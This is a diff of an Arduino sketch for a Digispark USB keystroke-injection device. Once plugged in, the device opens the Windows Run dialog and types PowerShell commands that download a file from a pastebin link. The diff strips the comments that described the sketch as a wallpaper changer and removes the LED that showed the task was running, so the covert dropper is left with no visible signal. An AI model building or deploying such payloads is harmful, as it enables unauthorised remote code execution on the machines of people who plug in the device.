@@ -1,16 +1,11 @@
-// Changes wallpaper to whatever you want.
-// Tested working Windows 11.
 #include "DigiKeyboard.h"
 #define KEY_LEFT 0x50
-// CHANGE THE LINK BELOW BEFORE USING
 #define link "https://pastebin.com/raw/e7QyYRh7"
 void setup() {
-  pinMode(1, OUTPUT); // LED Setup
 }
 void loop() {
   DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  digitalWrite(1, HIGH); // Turn on LED to signify task started
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
 
@@ -20,7 +15,6 @@ void loop() {
   DigiKeyboard.println("$client = new-object System.Net.WebClient");
   DigiKeyboard.println("Remove-Item $path -ErrorAction SilentlyContinue");
   DigiKeyboard.delay(500);
-  // MAKE SURE TO UPDATE THIS PASTEBIN ACCORDING TO THE SCRIPT.PS1
   DigiKeyboard.println("$client.DownloadFile(\""link"\", $path)");
   DigiKeyboard.delay(4000);
 
@@ -40,7 +34,5 @@ void loop() {
     DigiKeyboard.delay(300);
     DigiKeyboard.println("exit");
   }
-
-  digitalWrite(1, LOW);
-  for(;;){}
+  for(;;){} 
 }
